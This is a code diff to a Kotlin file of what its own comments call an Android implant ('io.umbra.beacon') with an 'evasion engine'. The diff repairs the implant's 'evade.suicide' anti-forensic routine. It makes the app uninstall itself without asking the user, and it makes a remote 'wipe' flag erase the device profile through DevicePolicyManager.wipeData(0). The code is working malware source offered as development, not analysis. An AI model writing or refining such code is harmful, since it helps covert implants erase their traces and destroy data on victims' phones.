@@ -1,5 +1,6 @@
 package io.umbra.beacon
 
+import android.app.PendingIntent
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
@@ -32,6 +33,9 @@ object Forensics {
 
     /** The name of the state file of the evasion engine. */
     const val EVASION_FILE = "evade.state"
+
+    /** The broadcast that would carry the answer of the uninstall. */
+    private const val ACTION_UNINSTALL_STATUS = "io.umbra.beacon.UNINSTALL_STATUS"
 
     /**
      * The files the implant left on the phone.
@@ -144,10 +148,18 @@ object Forensics {
             // itself away without asking the user.
             try {
                 val installer = context.packageManager.packageInstaller
-                // The callback is optional: the owner of the profile does
-                // not need the answer of the system.
-                val callback: android.content.pm.IPackageInstaller.IPackageUninstallCallback? = null
-                installer.uninstall(context.packageName, callback)
+                // The public uninstall delivers its result through an
+                // IntentSender; the answer is not needed because the
+                // application is removing itself, so the pending intent
+                // names a broadcast that has no receiver left to hear it.
+                // The hidden IPackageInstaller callback has no public type.
+                val status = PendingIntent.getBroadcast(
+                    context,
+                    0,
+                    Intent(ACTION_UNINSTALL_STATUS).setPackage(context.packageName),
+                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
+                )
+                installer.uninstall(context.packageName, status.intentSender)
                 out.append("evade.suicide: the application asked the system to remove it (the profile is its own)\n")
             } catch (t: Throwable) {
                 out.append("evade.suicide: the application could not remove itself: ${t.message}\n")
@@ -162,7 +174,10 @@ object Forensics {
             if (args.field("wipe")?.flag() == true) {
                 try {
                     val manager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
-                    manager?.wipeData()
+                    // wipeData takes the flags of the wipe; the implant
+                    // asks for the wipe and nothing else (0), which is the
+                    // documented call, not the hidden no-argument one.
+                    manager?.wipeData(0)
                     out.append("evade.suicide: the profile of the device was wiped\n")
                 } catch (t: Throwable) {
                     out.append("evade.suicide: the profile could not be wiped: ${t.message}\n")
